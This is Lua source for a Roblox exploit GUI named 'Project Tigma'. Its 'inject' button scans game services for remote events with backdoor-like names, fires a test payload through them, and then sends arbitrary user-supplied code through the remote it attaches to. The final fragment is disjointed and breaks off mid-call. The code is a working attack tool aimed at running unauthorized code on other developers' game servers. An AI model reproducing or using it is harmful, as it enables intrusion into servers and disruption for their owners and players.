LMG2L["TextButton3_9"].MouseButton1Click:Connect(function()
    if injected then 
        notify("Already","BACKDOOR FOUND.") 
        return 
    end 
    
    local function attempt()
        LMG2L["TextButton3_9"].Text = "SCANNING..."
        LMG2L["TextButton3_9"].BackgroundColor3 = Color3.fromRGB(200,180,60)
        
        local scanServices = {
            JS,
            RS,
            game:GetService("ServerScriptService"),
            game:GetService("ServerStorage"),
        }
        
        local suspiciousPatterns = {
            "anticheat", "antivirus", "load", "exec", "execute", "spawn", "run", "require",
            "admin", "backdoor", "crash", "command", "remote", "event", "function", "spawns"
        }
        
        local possible = {}
        
        for _, svc in ipairs(scanServices) do
            for _, child in ipairs(svc:GetChildren()) do
                if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                    local n = child.Name:lower()
                    if n:match("^%u%l+%d%d%d%d%d$") or n:match("^antivirus%d+$") then
                        table.insert(possible, child)
                    end
                    for _, pat in ipairs(suspiciousPatterns) do
                        if n:find(pat) then
                            table.insert(possible, child)
                            break
                        end
                    end
                end
            end
        end
        
        if #possible == 0 then
            return false
        end
        
        local testPayload = [[print("[TIGMA] Test success - "..game.Players.LocalPlayer.Name)]]
        
        local function tryFire(r)
            pcall(function()
                if r:IsA("RemoteEvent") then
                    r:FireServer(testPayload)
                    task.wait(0.03)
                    r:FireServer(LP, testPayload)
                    task.wait(0.03)
                    r:FireServer(testPayload, workspace)
                elseif r:IsA("RemoteFunction") then
                    r:InvokeServer(testPayload)
                    task.wait(0.03)
                    r:InvokeServer(LP, testPayload)
                end
            end)
        end
        
        local attached = nil
        for _, rem in ipairs(possible) do
            tryFire(rem)
            task.wait(0.07)
            attached = rem
            break
        end
        
        if attached then
            injected = true
            attachedRemote = attached
            return true
        end
        
        return false
    end
    
    local success = attempt()
    
    if not success then
        task.wait(0.5)
        success = attempt()
    end
    
    if success then
        LMG2L["TextButton3_9"].Text = "SUCCESS!"
        LMG2L["TextButton3_9"].BackgroundColor3 = Color3.fromRGB(50,120,60)
        notify("Inject Success", "Done.")
        
        -- Khôi phục popup TIGMA + credit khi thành công
        local successGui = Instance.new("ScreenGui")
        successGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
        successGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        
        local textLabel2 = Instance.new("TextLabel", successGui)
        textLabel2.TextWrapped = true
        textLabel2.BorderSizePixel = 0
        textLabel2.TextSize = 35
        textLabel2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        textLabel2.Size = UDim2.new(0, 170, 0, 0)
        textLabel2.Text = [[TIGMA]]
        textLabel2.Position = UDim2.new(0, -2, 0, 326)
        
        local uiStroke3 = Instance.new("UIStroke", textLabel2)
        uiStroke3.Thickness = 4
        uiStroke3.Color = Color3.fromRGB(255, 255, 255)
        
        local textLabel4 = Instance.new("TextLabel", textLabel2)
        textLabel4.TextWrapped = true
        textLabel4.ZIndex = 2
        textLabel4.BorderSizePixel = 0
        textLabel4.TextScaled = true
        textLabel4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        textLabel4.TextColor3 = Color3.fromRGB(0, 0, 0)
        textLabel4.Size = UDim2.new(0, 128, 0, 64)
        textLabel4.Text = [[Project Tigma make by oRitOkidd.]]
        textLabel4.Position = UDim2.new(0, 160, 0, -92)
        
        local uiStroke5 = Instance.new("UIStroke", textLabel4)
        uiStroke5.Color = Color3.fromRGB(255, 255, 255)
        
        local frame6 = Instance.new("Frame", textLabel2)
        frame6.BorderSizePixel = 0
        frame6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        frame6.Size = UDim2.new(0, 128, 0, 64)

    else
        LMG2L["TextButton3_9"].Text = "FAILED"
        LMG2L["TextButton3_9"].BackgroundColor3 = Color3.fromRGB(140,50,50)
        notify("Inject Failed", "No backdoor.")
        task.wait(1.2)
        LMG2L["TextButton3_9"].Text = "INJECT"
        LMG2L["TextButton3_9"].BackgroundColor3 = Color3.fromRGB(129, 129, 129)
    end
end)

        notify("Error", "No script.")
        return

    local pats = {'"yourusername"','"username"','"name"','"plr"','"player"'}
    for _,p in pats do code = code:gsub(p, '"'..playerName..'"') end
    
    pcall(function()
        if attachedRemote:IsA("RemoteEvent") then
            attachedRemote:FireServer(code)
            attachedRemote:FireServer(LP, code)

            attachedRemote:InvokeServer(code)
